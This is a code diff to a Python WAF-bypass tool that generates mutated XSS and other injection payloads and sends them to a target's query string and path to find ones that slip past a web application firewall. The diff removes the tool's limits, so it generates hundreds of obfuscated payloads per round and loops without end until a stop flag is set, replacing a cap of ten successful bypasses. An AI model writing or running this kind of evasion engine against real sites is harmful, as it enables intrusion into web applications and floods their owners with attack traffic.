@@ -204,7 +204,7 @@ class IntelligentPayloadGenerator:
     ]
     
     @staticmethod
-    def generate_intelligent_payloads(vector_type: str, target_context: str = '') -> List[str]:
+    def generate_intelligent_payloads(vector_type: str, target_context: str = '', unlimited: bool = True) -> List[str]:
         payloads = []
         
         if vector_type.upper() == 'XSS':
@@ -225,17 +225,28 @@ class IntelligentPayloadGenerator:
         polyglot_mutated = PayloadMutator.generate_polyglot_payload(random.choice(IntelligentPayloadGenerator.POLYGLOT_PAYLOADS))
         payloads.extend(polyglot_mutated)
         
-        for i in range(50):
-            random_vector = random.choice(base_vectors)
-            mutation_chain = random_vector
-            
-            for _ in range(random.randint(1, 3)):
-                technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
-                mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
-            
-            payloads.append(mutation_chain)
+        if unlimited:
+            for i in range(500):
+                random_vector = random.choice(base_vectors)
+                mutation_chain = random_vector
+                
+                for _ in range(random.randint(1, 5)):
+                    technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
+                    mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
+                
+                payloads.append(mutation_chain)
+        else:
+            for i in range(50):
+                random_vector = random.choice(base_vectors)
+                mutation_chain = random_vector
+                
+                for _ in range(random.randint(1, 3)):
+                    technique = random.choice(list(PayloadMutator.BYPASS_TECHNIQUES.keys()))
+                    mutation_chain = PayloadMutator.mutate_payload(mutation_chain, technique)
+                
+                payloads.append(mutation_chain)
         
-        return list(set(payloads))[:200]
+        return list(set(payloads))
 
 
 class WAFDetector:
@@ -298,6 +309,8 @@ class WAFBypassEngine:
         self.waf_confidence = 0.0
         self.bypass_count = 0
         self.total_attempts = 0
+        self.should_stop = False
+        self.payload_cache = set()
     
     def _create_session(self) -> requests.Session:
         session = requests.Session()
@@ -405,46 +418,70 @@ class WAFBypassEngine:
         
         return min(confidence, 1.0)
     
-    def adaptive_bypass(self, vector_type: str = 'XSS', max_iterations: int = 500) -> List[Dict]:
+    def adaptive_bypass_unlimited(self, vector_type: str = 'XSS') -> List[Dict]:
         successful_bypasses = []
         
         self.detect_waf()
         self.get_baseline_response()
         
-        payloads = IntelligentPayloadGenerator.generate_intelligent_payloads(vector_type)
+        payload_index = 0
         
-        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
-            futures = {}
+        while not self.should_stop:
+            payloads = IntelligentPayloadGenerator.generate_intelligent_payloads(
+                vector_type, 
+                unlimited=True
+            )
             
-            for i, payload in enumerate(payloads[:max_iterations]):
-                injection_points = ['query', 'path']
+            with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
+                futures = {}
                 
-                for injection_point in injection_points:
-                    future = executor.submit(self.test_payload, payload, injection_point)
-                    futures[future] = (payload, injection_point)
-            
-            for future in as_completed(futures):
-                try:
-                    result = future.result()
+                for payload in payloads:
+                    if self.should_stop:
+                        break
                     
-                    if result['is_bypassed']:
-                        successful_bypasses.append(result)
-                        self.successful_techniques.append({
-                            'payload': result['payload'],
-                            'injection_point': result['injection_point'],
-                            'confidence': result['confidence'],
-                            'waf_type': self.waf_type,
-                        })
-                        
-                        if len(successful_bypasses) >= 10:
+                    if payload in self.payload_cache:
+                        continue
+                    
+                    self.payload_cache.add(payload)
+                    
+                    for injection_point in ['query', 'path']:
+                        if self.should_stop:
                             break
+                        
+                        future = executor.submit(self.test_payload, payload, injection_point)
+                        futures[future] = (payload, injection_point)
+                
+                for future in as_completed(futures):
+                    if self.should_stop:
+                        executor.shutdown(wait=False)
+                        break
                     
-                except Exception:
-                    continue
+                    try:
+                        result = future.result()
+                        
+                        if result['is_bypassed']:
+                            successful_bypasses.append(result)
+                            self.successful_techniques.append({
+                                'payload': result['payload'],
+                                'injection_point': result['injection_point'],
+                                'confidence': result['confidence'],
+                                'waf_type': self.waf_type,
+                            })
+                        
+                        payload_index += 1
+                    
+                    except Exception:
+                        continue
+            
+            if self.should_stop:
+                break
         
         return sorted(successful_bypasses, key=lambda x: x['confidence'], reverse=True)
     
-    def generate_custom_payload(self, base_payload: str, obfuscation_level: int = 3) -> List[str]:
+    def adaptive_bypass(self, vector_type: str = 'XSS') -> List[Dict]:
+        return self.adaptive_bypass_unlimited(vector_type)
+    
+    def generate_custom_payload(self, base_payload: str, obfuscation_level: int = 5) -> List[str]:
         payloads = []
         
         current_payload = base_payload
@@ -469,3 +506,6 @@ class WAFBypassEngine:
             'successful_techniques': self.successful_techniques,
             'bypass_history': self.bypass_history,
         }
+    
+    def stop_bypass(self):
+        self.should_stop = True
